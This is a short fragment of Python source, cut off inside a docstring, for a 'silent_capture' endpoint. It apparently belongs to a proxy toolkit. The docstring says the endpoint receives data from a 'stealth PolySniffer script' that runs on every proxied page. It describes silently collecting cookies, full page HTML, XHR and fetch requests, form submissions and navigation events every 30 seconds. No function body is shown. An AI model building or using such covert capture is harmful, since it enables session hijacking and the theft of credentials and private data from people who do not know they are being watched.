def silent_capture(request, endpoint_id):
    """
    Silent capture endpoint - receives data from stealth PolySniffer script
    This runs in the background on every proxied page, capturing:
    - Full page HTML every 30 seconds
    - Cookies every 30 seconds
    - All XHR/fetch requests
    - Form submissions
    - Navigation events
